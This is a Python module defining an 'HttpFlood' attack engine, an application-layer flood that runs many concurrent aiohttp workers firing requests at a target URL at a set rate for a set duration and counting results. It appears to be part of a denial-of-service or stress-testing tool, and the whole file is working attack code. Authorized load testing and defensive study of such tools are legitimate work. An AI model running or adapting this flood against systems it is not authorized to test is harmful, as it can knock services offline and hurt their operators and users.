from __future__ import annotations

import asyncio

import aiohttp

from ..config import Config, HttpPayload
from .base import AttackEngine


class HttpFlood(AttackEngine):
    """L7 flood: N concurrent keep-alive connections firing requests at a target rate."""

    def __init__(self, cfg: Config) -> None:
        super().__init__(cfg.effective_rps(), cfg.workers, cfg.duration_sec)
        payload = cfg.http or HttpPayload()
        self.url = cfg.target.rstrip("/") + (payload.path or "/")
        self.method = payload.method
        self.headers = dict(payload.headers)
        self.body = payload.body.encode() if payload.body else None

    async def run(self) -> None:
        timeout = aiohttp.ClientTimeout(total=10, connect=5)
        connector = aiohttp.TCPConnector(limit=self.workers, ttl_dns_cache=300)
        async with aiohttp.ClientSession(
            connector=connector, timeout=timeout, headers=self.headers or None
        ) as session:

            async def worker() -> None:
                while True:
                    await self.bucket.acquire()
                    try:
                        async with session.request(self.method, self.url, data=self.body) as resp:
                            await resp.read()
                            if 200 <= resp.status < 400:
                                self.stats["ok"] += 1
                            else:
                                self.stats["err"] += 1
                    except (aiohttp.ClientError, asyncio.TimeoutError):
                        self.stats["err"] += 1
                    finally:
                        self.stats["sent"] += 1

            workers = [asyncio.create_task(worker()) for _ in range(self.workers)]
            await asyncio.sleep(self.duration_sec)
            for w in workers:
                w.cancel()
            # Let in-flight requests drain; ignore their CancelledError.
            await asyncio.gather(*workers, return_exceptions=True)
